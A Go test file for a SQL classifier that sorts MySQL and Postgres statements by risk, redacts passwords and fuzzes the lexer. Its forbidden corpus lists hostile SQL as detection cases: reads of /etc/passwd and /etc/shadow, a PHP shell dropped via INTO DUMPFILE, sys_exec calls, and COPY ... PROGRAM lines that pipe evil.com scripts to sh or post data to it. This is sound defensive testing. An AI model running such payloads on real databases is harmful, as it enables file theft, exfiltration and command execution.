package classifier_test

import (
	"strings"
	"testing"

	"github.com/auracp/auracp/pkg/dbadmin"
	"github.com/auracp/auracp/pkg/dbadmin/classifier"
)

// ─── Class assignment tests ──────────────────────────────────────────

func TestClassify_BasicClassAssignment_MySQL(t *testing.T) {
	cases := []struct {
		sql       string
		wantClass classifier.QueryClass
		wantKind  classifier.StatementKind
	}{
		{"SELECT 1", classifier.ClassRead, classifier.KindSelect},
		{"SHOW TABLES", classifier.ClassRead, classifier.KindShow},
		{"DESCRIBE users", classifier.ClassRead, classifier.KindDescribe},
		{"EXPLAIN SELECT * FROM t", classifier.ClassRead, classifier.KindExplain},
		{"USE mydb", classifier.ClassRead, classifier.KindUse},
		{"INSERT INTO users VALUES (1)", classifier.ClassWriteRow, classifier.KindInsert},
		{"REPLACE INTO users VALUES (1)", classifier.ClassWriteRow, classifier.KindReplace},
		{"UPDATE users SET name = 'x' WHERE id = 1", classifier.ClassWriteRow, classifier.KindUpdate},
		{"UPDATE users SET name = 'x'", classifier.ClassWriteRowMass, classifier.KindUpdate},
		{"DELETE FROM users WHERE id = 1", classifier.ClassWriteRow, classifier.KindDelete},
		{"DELETE FROM users", classifier.ClassWriteRowMass, classifier.KindDelete},
		{"TRUNCATE TABLE users", classifier.ClassWriteRowMass, classifier.KindTruncate},
		{"CREATE TABLE users (id INT)", classifier.ClassDDL, classifier.KindCreate},
		{"ALTER TABLE users ADD COLUMN x INT", classifier.ClassDDL, classifier.KindAlter},
		{"DROP TABLE users", classifier.ClassDDL, classifier.KindDrop},
		{"RENAME TABLE a TO b", classifier.ClassDDL, classifier.KindRename},
		{"GRANT SELECT ON *.* TO 'alice'@'%'", classifier.ClassDangerous, classifier.KindGrant},
		{"REVOKE ALL ON db.* FROM 'alice'@'%'", classifier.ClassDangerous, classifier.KindRevoke},
		{"SET GLOBAL max_connections = 100", classifier.ClassDangerous, classifier.KindSet},
		{"SET SESSION sql_mode = ''", classifier.ClassRead, classifier.KindSet},
		{"SET sql_mode = ''", classifier.ClassRead, classifier.KindSet}, // unscoped = session
		{"KILL 42", classifier.ClassDangerous, classifier.KindKill},
		{"FLUSH PRIVILEGES", classifier.ClassDangerous, classifier.KindFlush},
		{"CALL my_proc(1)", classifier.ClassWriteRow, classifier.KindCall},
		{"COMMIT", classifier.ClassRead, classifier.KindCommit},
		{"ROLLBACK", classifier.ClassRead, classifier.KindRollback},
		{"BEGIN", classifier.ClassRead, classifier.KindBegin},
		{"START TRANSACTION", classifier.ClassRead, classifier.KindStart},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			if pq.Class != c.wantClass {
				t.Errorf("class = %v, want %v", pq.Class, c.wantClass)
			}
			if len(pq.Statements) != 1 {
				t.Fatalf("got %d statements, want 1", len(pq.Statements))
			}
			if pq.Statements[0].Kind != c.wantKind {
				t.Errorf("kind = %v, want %v", pq.Statements[0].Kind, c.wantKind)
			}
		})
	}
}

func TestClassify_BasicClassAssignment_Postgres(t *testing.T) {
	cases := []struct {
		sql       string
		wantClass classifier.QueryClass
	}{
		{"SELECT 1", classifier.ClassRead},
		{"SHOW server_version", classifier.ClassRead},
		{"EXPLAIN ANALYZE SELECT * FROM t", classifier.ClassRead},
		{"INSERT INTO t (id) VALUES (1)", classifier.ClassWriteRow},
		{"UPDATE t SET x = 1 WHERE id = 1", classifier.ClassWriteRow},
		{"UPDATE t SET x = 1", classifier.ClassWriteRowMass},
		{"DELETE FROM t WHERE id = 1", classifier.ClassWriteRow},
		{"DELETE FROM t", classifier.ClassWriteRowMass},
		{"TRUNCATE t", classifier.ClassWriteRowMass},
		{"CREATE TABLE t (id INT)", classifier.ClassDDL},
		{"ALTER TABLE t ADD COLUMN x INT", classifier.ClassDDL},
		{"DROP TABLE t", classifier.ClassDDL},
		{"REINDEX TABLE t", classifier.ClassDDL},
		{"VACUUM ANALYZE t", classifier.ClassDDL},
		{"GRANT SELECT ON t TO bob", classifier.ClassDangerous},
		{"REVOKE ALL ON t FROM bob", classifier.ClassDangerous},
		{"SET search_path TO public", classifier.ClassRead},
		{"SET LOCAL search_path TO public", classifier.ClassRead},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EnginePostgres, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			if pq.Class != c.wantClass {
				t.Errorf("class = %v, want %v", pq.Class, c.wantClass)
			}
		})
	}
}

// ─── Multi-statement classification ──────────────────────────────────

func TestClassify_MultiStatement_TakesStrictest(t *testing.T) {
	sql := "SELECT 1; DROP TABLE foo; UPDATE t SET x = 1 WHERE id = 1"
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	// Three statements: read, ddl, write-row. Strictest = ddl.
	if len(pq.Statements) != 3 {
		t.Fatalf("got %d statements, want 3", len(pq.Statements))
	}
	if pq.Class != classifier.ClassDDL {
		t.Errorf("overall class = %v, want ClassDDL", pq.Class)
	}
	if pq.Statements[0].Class != classifier.ClassRead {
		t.Errorf("stmt[0].Class = %v, want ClassRead", pq.Statements[0].Class)
	}
	if pq.Statements[1].Class != classifier.ClassDDL {
		t.Errorf("stmt[1].Class = %v, want ClassDDL", pq.Statements[1].Class)
	}
	if pq.Statements[2].Class != classifier.ClassWriteRow {
		t.Errorf("stmt[2].Class = %v, want ClassWriteRow", pq.Statements[2].Class)
	}
}

func TestClassify_MultiStatement_ForbiddenWins(t *testing.T) {
	sql := "SELECT 1; SELECT LOAD_FILE('/etc/shadow'); SELECT 2"
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.Class != classifier.ClassForbidden {
		t.Errorf("overall class = %v, want ClassForbidden", pq.Class)
	}
	if len(pq.Forbidden) == 0 {
		t.Error("Forbidden hits empty")
	}
}

// ─── Forbidden list — the CVE-corpus tests ───────────────────────────

func TestClassify_Forbidden_MySQL(t *testing.T) {
	corpus := []struct {
		name string
		sql  string
	}{
		{
			"plain LOAD_FILE",
			`SELECT LOAD_FILE('/etc/passwd')`,
		},
		{
			"LOAD_FILE with whitespace",
			`SELECT   LOAD_FILE   (   '/etc/passwd'   )`,
		},
		{
			"LOAD_FILE case-mixed",
			`SELECT Load_File('/etc/passwd')`,
		},
		{
			"LOAD_FILE comment-obfuscated",
			`SELECT LOAD_FILE /* gotcha */ ('/etc/passwd')`,
		},
		{
			"LOAD_FILE inside subquery",
			`SELECT * FROM (SELECT LOAD_FILE('/etc/passwd') AS x) AS t`,
		},
		{
			"INTO OUTFILE basic",
			`SELECT * FROM users INTO OUTFILE '/tmp/exfil'`,
		},
		{
			"INTO OUTFILE mixed case",
			`SELECT * FROM users Into Outfile '/tmp/x'`,
		},
		{
			"INTO DUMPFILE variant",
			`SELECT 'rce' INTO DUMPFILE '/var/www/html/shell.php'`,
		},
		{
			"LOAD DATA INFILE",
			`LOAD DATA INFILE '/etc/hosts' INTO TABLE t`,
		},
		{
			"sys_exec UDF",
			`SELECT sys_exec('id')`,
		},
		{
			"sys_eval UDF",
			`SELECT sys_eval('whoami')`,
		},
	}
	for _, c := range corpus {
		t.Run(c.name, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			if pq.Class != classifier.ClassForbidden {
				t.Errorf("class = %v, want ClassForbidden (sql=%q, forbidden=%v)",
					pq.Class, c.sql, pq.Forbidden)
			}
			if len(pq.Forbidden) == 0 {
				t.Error("ParsedQuery.Forbidden empty for forbidden statement")
			}
		})
	}
}

func TestClassify_Forbidden_Postgres(t *testing.T) {
	corpus := []struct {
		name string
		sql  string
	}{
		{
			"COPY FROM PROGRAM",
			`COPY t FROM PROGRAM 'curl evil.com/x.sh | sh'`,
		},
		{
			"COPY TO PROGRAM",
			`COPY (SELECT * FROM secrets) TO PROGRAM 'curl -d @- evil.com'`,
		},
		{
			"COPY FROM PROGRAM with column list",
			`COPY t (a, b) FROM PROGRAM 'sh -c "echo pwn"'`,
		},
		{
			"COPY FROM path",
			`COPY t FROM '/etc/passwd'`,
		},
		{
			"COPY TO path",
			`COPY t TO '/tmp/exfil.csv'`,
		},
		{
			"pg_read_file",
			`SELECT pg_read_file('/etc/passwd', 0, 1000)`,
		},
		{
			"pg_read_binary_file",
			`SELECT pg_read_binary_file('/etc/passwd')`,
		},
		{
			"pg_ls_dir",
			`SELECT pg_ls_dir('/etc')`,
		},
		{
			"pg_stat_file",
			`SELECT pg_stat_file('/etc/passwd')`,
		},
		{
			"lo_import",
			`SELECT lo_import('/etc/passwd')`,
		},
		{
			"lo_export",
			`SELECT lo_export(16385, '/tmp/exfil')`,
		},
		{
			"CREATE EXTENSION FROM path",
			`CREATE EXTENSION foo FROM 'unsafe-version'`,
		},
		{
			"dblink_connect_u",
			`SELECT dblink_connect_u('host=evil.com user=root')`,
		},
		{
			"CREATE FUNCTION plpythonu",
			`CREATE FUNCTION attack() RETURNS void AS 'import os; os.system("id")' LANGUAGE plpythonu`,
		},
		{
			"CREATE FUNCTION plpython3u",
			`CREATE FUNCTION attack() RETURNS void AS 'pass' LANGUAGE plpython3u`,
		},
		{
			"CREATE FUNCTION plperlu",
			`CREATE FUNCTION attack() RETURNS void AS 'system("id")' LANGUAGE plperlu`,
		},
		{
			"CREATE FUNCTION plsh",
			`CREATE FUNCTION attack() RETURNS void AS '#!/bin/sh' LANGUAGE plsh`,
		},
	}
	for _, c := range corpus {
		t.Run(c.name, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EnginePostgres, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			if pq.Class != classifier.ClassForbidden {
				t.Errorf("class = %v, want ClassForbidden (sql=%q, forbidden=%v)",
					pq.Class, c.sql, pq.Forbidden)
			}
			if len(pq.Forbidden) == 0 {
				t.Error("ParsedQuery.Forbidden empty for forbidden statement")
			}
		})
	}
}

// ─── False-positive tests: legitimate uses that LOOK like forbidden ──

func TestClassify_NotForbidden_StringsAreSafe(t *testing.T) {
	// Forbidden keywords inside string literals must NOT trigger the
	// matcher. This is the regex-killer case: a regex looking for
	// LOAD_FILE in raw text would false-positive on these.
	cases := []struct {
		engine dbadmin.EngineKind
		sql    string
	}{
		{
			dbadmin.EngineMariaDB,
			`INSERT INTO audit_log (msg) VALUES ('legacy LOAD_FILE error')`,
		},
		{
			dbadmin.EngineMariaDB,
			`SELECT 'INTO OUTFILE was deprecated' AS reason`,
		},
		{
			dbadmin.EnginePostgres,
			`INSERT INTO audit_log VALUES ('COPY FROM PROGRAM was attempted')`,
		},
		{
			dbadmin.EnginePostgres,
			`SELECT 'pg_read_file' AS function_name`,
		},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(c.engine, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			if pq.Class == classifier.ClassForbidden {
				t.Errorf("false positive: %q classified Forbidden (%v)", c.sql, pq.Forbidden)
			}
		})
	}
}

func TestClassify_NotForbidden_CommentsAreSafe(t *testing.T) {
	// Forbidden keywords inside comments must NOT trigger.
	cases := []struct {
		engine dbadmin.EngineKind
		sql    string
	}{
		{dbadmin.EngineMariaDB, `SELECT 1 -- LOAD_FILE('/x') would be bad`},
		{dbadmin.EngineMariaDB, `SELECT 1 /* INTO OUTFILE blocked here */`},
		{dbadmin.EnginePostgres, `SELECT 1 -- COPY FROM PROGRAM 'x'`},
		{dbadmin.EnginePostgres, `SELECT 1 /* pg_read_file gotcha */`},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(c.engine, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			if pq.Class == classifier.ClassForbidden {
				t.Errorf("false positive on commented forbidden keyword: %q (%v)", c.sql, pq.Forbidden)
			}
		})
	}
}

func TestClassify_NotForbidden_QuotedIdentifiersAreSafe(t *testing.T) {
	// A backtick-quoted column named `LOAD_FILE` (MySQL) or a
	// double-quoted column named "pg_read_file" (Postgres) is a
	// reference to a USER-CREATED identifier, not the dangerous
	// function. Must not trigger the matcher.
	cases := []struct {
		engine dbadmin.EngineKind
		sql    string
	}{
		{dbadmin.EngineMariaDB, "SELECT `LOAD_FILE` FROM t"},
		{dbadmin.EngineMariaDB, "SELECT `SYS_EXEC` FROM t"},
		{dbadmin.EnginePostgres, `SELECT "pg_read_file" FROM t`},
		{dbadmin.EnginePostgres, `SELECT "lo_import" FROM t`},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(c.engine, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			if pq.Class == classifier.ClassForbidden {
				t.Errorf("false positive on quoted identifier: %q (%v)", c.sql, pq.Forbidden)
			}
		})
	}
}

func TestClassify_NotForbidden_DollarStringIsSafe(t *testing.T) {
	// Postgres dollar-quoted body containing forbidden tokens must
	// NOT trigger. This is the Postgres-side regex-killer.
	sql := `SELECT $body$
		I wonder if pg_read_file('/etc/passwd') would work?
		Also COPY FROM PROGRAM 'sh' is a no-no.
	$body$`
	pq, err := classifier.Classify(dbadmin.EnginePostgres, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.Class == classifier.ClassForbidden {
		t.Errorf("false positive on dollar-string: forbidden=%v", pq.Forbidden)
	}
}

// ─── ParsedStatement detail tests ────────────────────────────────────

func TestClassify_Action_MatchesClass(t *testing.T) {
	cases := []struct {
		sql        string
		wantAction dbadmin.Action
	}{
		{"SELECT 1", dbadmin.ActionQueryRead},
		{"INSERT INTO t VALUES (1)", dbadmin.ActionQueryWrite},
		{"UPDATE t SET x = 1 WHERE id = 1", dbadmin.ActionQueryWrite},
		{"CREATE TABLE t (id INT)", dbadmin.ActionQueryDDL},
		{"GRANT SELECT ON t TO bob", dbadmin.ActionQueryDangerous},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			if len(pq.Statements) == 0 || pq.Statements[0].Action != c.wantAction {
				got := dbadmin.Action("")
				if len(pq.Statements) > 0 {
					got = pq.Statements[0].Action
				}
				t.Errorf("action = %q, want %q", got, c.wantAction)
			}
		})
	}
}

func TestClassify_HasWhere(t *testing.T) {
	cases := []struct {
		sql      string
		wantHas  bool
		wantMass bool
	}{
		{"UPDATE t SET x = 1 WHERE id = 1", true, false},
		{"UPDATE t SET x = 1", false, true},
		{"DELETE FROM t WHERE id = 1", true, false},
		{"DELETE FROM t", false, true},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			ps := pq.Statements[0]
			if ps.HasWhere != c.wantHas {
				t.Errorf("HasWhere = %v, want %v", ps.HasWhere, c.wantHas)
			}
			isMass := ps.Class == classifier.ClassWriteRowMass
			if isMass != c.wantMass {
				t.Errorf("mass = %v, want %v (class=%v)", isMass, c.wantMass, ps.Class)
			}
		})
	}
}

func TestClassify_Empty(t *testing.T) {
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) != 0 {
		t.Errorf("empty input produced %d statements, want 0", len(pq.Statements))
	}
}

func TestClassify_WhitespaceOnly(t *testing.T) {
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, "   \n\n  ")
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) != 0 {
		t.Errorf("whitespace-only input produced %d statements, want 0", len(pq.Statements))
	}
}

func TestClassify_CommentsOnly(t *testing.T) {
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, "-- just a comment\n/* and another */")
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) != 0 {
		t.Errorf("comments-only input produced %d statements, want 0", len(pq.Statements))
	}
}

func TestClassify_TooLarge(t *testing.T) {
	big := strings.Repeat("a", 17*1024*1024) // > maxSQLBytes
	_, err := classifier.Classify(dbadmin.EngineMariaDB, big)
	if err == nil {
		t.Error("expected ErrTooLarge for oversize input, got nil")
	}
}

func TestClassify_UnknownEngine(t *testing.T) {
	_, err := classifier.Classify(dbadmin.EngineKind(99), "SELECT 1")
	if err == nil {
		t.Error("expected error for unknown engine, got nil")
	}
}

// ─── Redaction ──────────────────────────────────────────────────────

func TestRedactSensitiveInline(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{
			"MySQL CREATE USER IDENTIFIED BY",
			`CREATE USER 'alice'@'%' IDENTIFIED BY 'hunter2'`,
			`CREATE USER 'alice'@'%' IDENTIFIED BY '[redacted]'`,
		},
		{
			"MySQL ALTER USER IDENTIFIED BY",
			`ALTER USER 'bob'@'%' IDENTIFIED BY 'p@ssw0rd'`,
			`ALTER USER 'bob'@'%' IDENTIFIED BY '[redacted]'`,
		},
		{
			"Postgres CREATE ROLE WITH PASSWORD",
			`CREATE ROLE bob WITH PASSWORD 'secret'`,
			`CREATE ROLE bob WITH PASSWORD '[redacted]'`,
		},
		{
			"Postgres ALTER ROLE PASSWORD",
			`ALTER ROLE alice PASSWORD 'newpass'`,
			`ALTER ROLE alice PASSWORD '[redacted]'`,
		},
		{
			"no sensitive keyword",
			`SELECT 1`,
			`SELECT 1`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dialect := classifier.DialectMySQL
			if strings.Contains(c.name, "Postgres") {
				dialect = classifier.DialectPostgres
			}
			got := classifier.RedactSensitiveInline(c.in, dialect)
			if got != c.want {
				t.Errorf("RedactSensitiveInline:\n  in: %q\n got: %q\nwant: %q", c.in, got, c.want)
			}
		})
	}
}

func TestRedactSensitiveParams(t *testing.T) {
	in := map[string]any{
		"username":     "alice",
		"password":     "secret",
		"api_token":    "tok-xyz",
		"private_key":  "-----BEGIN-----",
		"safe_value":   42,
	}
	out := classifier.RedactSensitiveParams(in)
	if out["username"] != "alice" {
		t.Errorf("non-sensitive key was redacted: %v", out)
	}
	for _, k := range []string{"password", "api_token", "private_key"} {
		if out[k] != "[redacted]" {
			t.Errorf("key %q not redacted: got %v", k, out[k])
		}
	}
	if out["safe_value"] != 42 {
		t.Errorf("safe_value altered: %v", out["safe_value"])
	}
	// Original should be unmodified.
	if in["password"] != "secret" {
		t.Errorf("RedactSensitiveParams mutated input map")
	}
}

// ─── Fuzz harness: a forbidden statement must NEVER reclassify down ──

// FuzzClassify asserts an invariant: if we wrap a known-forbidden
// statement in random benign noise (whitespace, comments, extra
// SELECTs), the overall ParsedQuery.Class stays ClassForbidden.
// Catches regressions where matcher state isn't reset correctly
// across statements or padding bypasses the matcher.
func FuzzClassify(f *testing.F) {
	// Seed corpus: pairs of (engine, prefix, suffix) wrapping the
	// forbidden statement.
	f.Add(int(dbadmin.EngineMariaDB), "", "")
	f.Add(int(dbadmin.EngineMariaDB), "/* a */", "/* b */")
	f.Add(int(dbadmin.EngineMariaDB), "SELECT 1;", ";SELECT 2")
	f.Add(int(dbadmin.EngineMariaDB), "-- noise\n", "\n-- more")
	f.Add(int(dbadmin.EnginePostgres), "", "")
	f.Add(int(dbadmin.EnginePostgres), "SELECT 'safe';", "")

	// The forbidden seed must always classify Forbidden when present.
	const forbiddenSeed = "SELECT LOAD_FILE('/etc/x')"

	f.Fuzz(func(t *testing.T, engineInt int, prefix, suffix string) {
		// Constrain engine.
		var engine dbadmin.EngineKind
		switch engineInt % 2 {
		case 0:
			engine = dbadmin.EngineMariaDB
		case 1:
			engine = dbadmin.EnginePostgres
		}

		// Only MySQL has LOAD_FILE in the forbidden list. For
		// Postgres, swap to a Postgres-specific forbidden seed.
		seed := forbiddenSeed
		if engine == dbadmin.EnginePostgres {
			seed = "SELECT pg_read_file('/etc/passwd')"
		}

		sql := prefix + "\n" + seed + "\n" + suffix

		// Filter: skip inputs the fuzzer can craft that are too large.
		if len(sql) > 1024*1024 {
			t.Skip()
		}

		// Pre-flight: lex the input and check that the forbidden
		// keyword still appears as a TokIdent. If a hostile prefix
		// (e.g., an unterminated quote, an unbalanced dollar-tag)
		// swallowed the seed into a string/comment, that's not a
		// classifier bug — that input has NO forbidden token to
		// detect. Skip those inputs; they're not testing the
		// invariant we care about.
		dialect := classifier.DialectMySQL
		if engine == dbadmin.EnginePostgres {
			dialect = classifier.DialectPostgres
		}
		tokens := classifier.Lex(sql, classifier.LexOptions{Dialect: dialect})
		var forbiddenIdent string
		if engine == dbadmin.EngineMariaDB {
			forbiddenIdent = "LOAD_FILE"
		} else {
			forbiddenIdent = "PG_READ_FILE"
		}
		stillVisible := false
		for _, tok := range tokens {
			if tok.Kind == classifier.TokIdent && strings.EqualFold(tok.Text, forbiddenIdent) {
				stillVisible = true
				break
			}
		}
		if !stillVisible {
			t.Skip()
		}

		pq, err := classifier.Classify(engine, sql)
		if err != nil {
			t.Skipf("Classify err (likely ErrTooLarge): %v", err)
		}
		if pq.Class != classifier.ClassForbidden {
			t.Errorf("forbidden seed reclassified to %v\nSQL:\n%s\nForbidden hits: %v",
				pq.Class, sql, pq.Forbidden)
		}
	})
}

// FuzzLex asserts the lexer doesn't panic, hang, or run out of memory
// on arbitrary input. Tokens must always end with TokEOF and byte
// offsets must be monotonic non-decreasing.
func FuzzLex(f *testing.F) {
	f.Add("SELECT 1")
	f.Add("UPDATE t SET x = 1")
	f.Add("/* */ -- \n")
	f.Add("$$ ; $$")
	f.Add("'unterminated")
	f.Add("`unterminated")
	f.Add(strings.Repeat("a", 1024))

	f.Fuzz(func(t *testing.T, sql string) {
		if len(sql) > 64*1024 {
			t.Skip()
		}
		for _, dialect := range []classifier.Dialect{classifier.DialectMySQL, classifier.DialectPostgres} {
			tokens := classifier.Lex(sql, classifier.LexOptions{Dialect: dialect})
			if len(tokens) == 0 {
				t.Errorf("empty token slice for %q", sql)
				continue
			}
			if tokens[len(tokens)-1].Kind != classifier.TokEOF {
				t.Errorf("last token is not TokEOF: %+v", tokens[len(tokens)-1])
			}
			prev := -1
			for _, tok := range tokens {
				if tok.StartByte < prev {
					t.Errorf("non-monotonic StartByte: prev=%d, tok=%+v", prev, tok)
				}
				prev = tok.StartByte
			}
		}
	})
}
